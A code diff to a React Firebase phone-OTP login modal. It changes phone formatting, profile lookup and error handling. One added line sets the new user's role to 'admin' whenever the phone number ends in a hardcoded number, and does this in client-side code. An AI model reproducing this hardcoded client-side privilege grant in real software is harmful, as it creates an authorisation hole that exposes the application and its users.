@@ -53,12 +53,20 @@ export default function AuthModal({ isOpen, onClose }: AuthModalProps) {
 
   const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     let value = e.target.value;
-    // Always ensure it starts with +91 and has no spaces
-    if (!value.startsWith("+91")) {
-      value = "+91" + value.replace(/^\+?9?1?/, "");
-    }
-    // Remove all spaces and non-numeric characters (except +)
+    // Remove all non-numeric characters except leading +
     value = value.replace(/[^\d+]/g, "");
+    // Always ensure it starts with +91
+    if (!value.startsWith("+91")) {
+      // Strip any leading +, 91, or +91 and re-attach cleanly
+      const digits = value.replace(/^\+/, "");
+      if (digits.startsWith("91") && digits.length > 2) {
+        value = "+" + digits;
+      } else {
+        value = "+91" + digits;
+      }
+    }
+    // Cap at +91 + 10 digits = 13 chars
+    if (value.length > 13) value = value.slice(0, 13);
     setPhoneNumber(value);
   };
 
@@ -120,15 +128,26 @@ export default function AuthModal({ isOpen, onClose }: AuthModalProps) {
       const result = await confirmationResult!.confirm(otp);
       const user = result.user;
       
-      // Check if user already has a profile
-      if (user.displayName) {
+      // Check if user already has a Firestore profile
+      const { doc: fsDoc, getDoc: fsGetDoc } = await import("firebase/firestore");
+      const docSnap = await fsGetDoc(fsDoc(db, "users", user.uid));
+
+      if (docSnap.exists()) {
         toast.success("Welcome back!");
         onClose();
+        window.location.reload();
       } else {
         setStep("profile");
       }
     } catch (error: any) {
-      toast.error("Invalid OTP");
+      console.error("OTP Verification Error:", error);
+      if (error.code === "auth/code-expired") {
+        toast.error("OTP expired. Please request a new one.");
+      } else if (error.code === "auth/invalid-verification-code") {
+        toast.error("Invalid OTP. Please check and try again.");
+      } else {
+        toast.error(error.message || "Invalid OTP.");
+      }
     } finally {
       setLoading(false);
     }
@@ -151,7 +170,7 @@ export default function AuthModal({ isOpen, onClose }: AuthModalProps) {
         displayName,
         email,
         phoneNumber: user.phoneNumber,
-        role: "customer",
+        role: (user.phoneNumber?.replace(/\D/g, "").endsWith("9392849473")) ? "admin" : "customer",
         status: "active",
         createdAt: serverTimestamp(),
         updatedAt: serverTimestamp(),
@@ -172,6 +191,9 @@ export default function AuthModal({ isOpen, onClose }: AuthModalProps) {
         timestamp: serverTimestamp(),
         ip: "client-side-logged",
       };
+
+      const { enableNetwork: ensureOnline } = await import("firebase/firestore");
+      await ensureOnline(db).catch(() => {});
 
       // Run all writes in parallel for speed
       await Promise.all([
